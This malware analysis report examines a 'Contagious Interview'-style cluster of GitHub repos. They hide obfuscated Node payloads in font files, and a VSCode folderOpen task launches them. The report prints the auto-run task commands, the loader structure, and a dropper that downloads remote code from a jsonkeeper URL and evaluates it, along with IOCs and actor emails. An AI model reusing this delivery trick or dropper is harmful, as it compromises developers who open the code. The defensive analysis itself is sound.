# Task AC: BestCity Actor-Staging Cluster — Deep Dive

## Overview

Four GitHub repos constituting an actor-controlled "fake interview" trap. Victim is invited via
a job-offer pretext to clone one of these repos and open it in VSCode — triggering the
`folderOpen` task that runs the embedded payload.

**Key finding: This cluster uses a completely different C2 mechanism than the PolinRider/TRON
blockchain dead-drop campaign. These are two distinct actor clusters sharing only the VSCode
`folderOpen` delivery vector.**

---

## Repos and Payloads

| Repo | Account created | Commits | Payload file | Payload size | Type |
|------|----------------|---------|-------------|-------------|------|
| `technoknol/bestcity` | 2014-01-17 | 1 | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | WJS IIFE |
| `AbstractFruitFactory/bestcity-demo` | 2014-02-21 | 12 | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | WJS IIFE (identical) |
| `fullstackragab/bestcity` | 2021-10-01 | 100 | `webfonts/fa-brands-regular.woff2` | 9,357 B | obfuscator.io |
| `BestCity-v1/Demo-v1` | 2025-12-22 | 100 | `webfonts/fa-brands-regular.woff2` | 147,449 B | obfuscator.io |

**`technoknol/bestcity` and `AbstractFruitFactory/bestcity-demo` payloads are byte-identical.**

### `tasks.json` command variants

- `technoknol/bestcity` + `AbstractFruitFactory/bestcity-demo`:
  ```
  (command -v node >/dev/null 2>&1 && node ./public/fontawesome/fa-solid-400.woff2) || ...
  ```
  (Cross-platform dual-check — newer pattern)

- `fullstackragab/bestcity` + `BestCity-v1/Demo-v1`:
  ```
  node webfonts/fa-brands-regular.woff2
  ```
  (Simpler — older pattern, no cross-platform check)

---

## Actor Account Analysis

### Confirmed actor-controlled accounts

| Account | Created | Repos | Notes |
|---------|---------|-------|-------|
| `BestCity-v1` | 2025-12-22 | 1 | Created 3 days before first commit; no profile info; single payload repo |

### Victim / co-opted accounts

| Account | Created | Profile | Status |
|---------|---------|---------|--------|
| `technoknol` | 2014 | 89 repos, "Engineer, Meditator" | Real developer; repo was converted to bait |
| `fullstackragab` | 2021 | Senior Backend Engineer (Bixo) | Real developer; actor used their legitimacy |
| `AbstractFruitFactory` | 2014 | 55 repos | Old account; legitimacy unclear |

### Fake commit personas (actor-fabricated git history)

`fullstackragab/bestcity` and `BestCity-v1/Demo-v1` share an identical 100-commit fabricated
history with the same 4 fake developer personas:

| Persona | Email |
|---------|-------|
| Nicolas | `nicolasmelo12@gmail.com` |
| Ahmed | `myselfmail0301@gmail.com` |
| Finddlekins | `Fiddlekins@gmail.com` |
| Sebastian | `sbegaa@gmail.com` |

The commit messages are identical in both repos (same messages, same order) — clearly
LLM-generated commit history to simulate a multi-developer team project. This is a known
PolinRider/Contagious-Interview technique.

Additional actors' emails observed:
- `forbesmike200@gmail.com` — `technoknol/bestcity` single-commit author
- `williamherr8@gmail.com` — initial `AbstractFruitFactory/bestcity-demo` commit
- `alexander.wormbs@gmail.com` — all `AbstractFruitFactory` subsequent commits

---

## Payload Execution Chain (55K WJS — `technoknol` + `AbstractFruitFactory`)

### Layer 1 — WJS outer IIFE (55,985 bytes)

```javascript
let dnQo;
!function(){
  const QO5B = Array.prototype.slice.call(arguments);
  return eval("(function Qm9K(zCgD){
    const bajD = DHlD(zCgD, TZ8C(Qm9K.toString()));
    let vxbD = eval(bajD);
    return vxbD.apply(null, QO5B);
    function TZ8C(nn1C) { /* rolling XOR hash of function source → decryption key */ }
    function DHlD(ffoD, fhVD) { /* XOR decrypt: decodeURI(ffoD) XOR key */ }
  })(URL_ENCODED_PAYLOAD)");
}()
```

- `TZ8C` computes a hash of `Qm9K.toString()` — the function source code is its own key
- `DHlD` XOR-decrypts the URL-encoded payload with that key
- Tamper-detection: if any character of the source is changed, `TZ8C` gives a different key
  and decryption fails → `SyntaxError` → logs `'Error: the code has been tampered!'`

### Layer 2 — Obfuscated string-table setup (19,016 bytes, decrypted)

Sets up the `dnQo` string table (WJS's own string scrambling), then executes the actual logic.

### Layer 3 — Dropper (plaintext, decrypted by Layer 2)

```javascript
// 1. Collect system info via os, path modules
// 2. Write dropper to disk:
fs.writeFileSync('/tmp/programx64/main.js', dropper_code);

// 3. Run dropper:
execSync('cd "/tmp/programx64" && npm install axios && node main.js');
```

### Layer 4 — `main.js` dropper (plaintext, written to disk)

```javascript
const os = require('os');
const fs = require('fs');
const { execSync } = require('child_process');

process.title = 'Node.js JavaScript Runtime';   // ← evasion: masquerade as legitimate Node

// Install axios silently
try {
  execSync('npm install --save axios request --legacy-peer-deps --no-warnings --no-save --no-progress --loglevel silent',
    { windowsHide: true });
} catch(e) {}

// Fetch and execute Stage 2 from dead-drop
try {
  const axios = require('axios');
  async function getCookie() {
    // C2 URL base64-encoded: https://www.jsonkeeper.com/b/85QGH
    const res = await axios.get(atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi84NVFHSA=='));
    // Eval res.data.model as a function with require access
    new (Function.constructor)('require', res.data.model)(require);
  }
  getCookie();
} catch(error) {}
```

---

## C2 Architecture

| Element | BestCity cluster | PolinRider/TRON cluster |
|---------|-----------------|------------------------|
| Dead-drop | `jsonkeeper.com/b/85QGH` | TRON W1/W2 wallets → BSC tx |
| Protocol | HTTPS via `axios` (npm install) | Node.js `https` built-in |
| URL encoding | Base64 (`atob`) | Embedded as obfuscated string |
| Stage fetch | `res.data.model` JSON field | XOR-decrypt `result.input` |
| Execution | `new (Function.constructor)(...)` | `eval(r)` / `child_process.spawn` |
| Evasion | `process.title = 'Node.js JavaScript Runtime'` | Detached spawn |
| Temp file | `/tmp/programx64/main.js` | No temp file (direct eval) |
| C2 status | **DEAD** (404 as of 2026-06-29) | Active |
| Blockchain | None | TRON + Aptos + BSC |

**No shared IOCs between BestCity and PolinRider.** No TRON wallets, no XOR keys, no BSC
RPCs. These are two distinct actors using the same VSCode `folderOpen` delivery vector.

---

## IOCs

| Type | Value | Notes |
|------|-------|-------|
| C2 URL | `https://www.jsonkeeper.com/b/85QGH` | Dead (404) |
| Temp path | `/tmp/programx64/main.js` | Dropper staging path |
| npm install | `axios`, `request` | Silently installed |
| Process name | `Node.js JavaScript Runtime` | `process.title` evasion |
| Commit emails | `forbesmike200@gmail.com`, `williamherr8@gmail.com`, `alexander.wormbs@gmail.com` | Actor-adjacent |
| Fake personas | `nicolasmelo12@gmail.com`, `myselfmail0301@gmail.com`, `Fiddlekins@gmail.com`, `sbegaa@gmail.com` | Shared across repos |

---

## Assessment

### Attribution

This cluster matches the **"Contagious Interview"** TTPs documented for Lazarus Group / Famous
Chollima sub-cluster:
- Fake job interview pretext → clone repo + open in IDE
- VSCode `folderOpen` task triggers execution without explicit user action
- Multi-layer WJS obfuscation with tamper detection
- Fabricated git commit history with multiple fake developer personas
- Real estate / fintech application theme (plausible for developer interviews)

However, **this cluster does NOT share infrastructure with the PolinRider TRON/BSC campaign**
documented in Tasks A–AL. The jsonkeeper.com dead-drop and `/tmp/programx64/` path are unique
to this cluster.

### C2 Status

`jsonkeeper.com/b/85QGH` returns 404 as of 2026-06-29 — the dead-drop has been deleted or
expired. The cluster appears to be **inactive** (C2 down).

### Timeline

| Date | Event |
|------|-------|
| 2025-09-22 | `fullstackragab/bestcity` first commit (fake history starts) |
| 2025-10-02 | `fullstackragab/bestcity` fake history complete |
| 2025-11-18 | `technoknol/bestcity` single commit |
| 2025-11-19 | `BestCity-v1/Demo-v1` fake history starts |
| 2025-11-28 | `BestCity-v1/Demo-v1` fake history complete |
| 2025-12-22 | `BestCity-v1` account created; Ragab adds 2 real commits to fullstackragab |
| 2026-01-03 | `AbstractFruitFactory/bestcity-demo` initial commit (williamherr8) |
| 2026-01-18–19 | AbstractFruitFactory pushes 11 more commits |
| 2026-06-29 | C2 dead (404) |
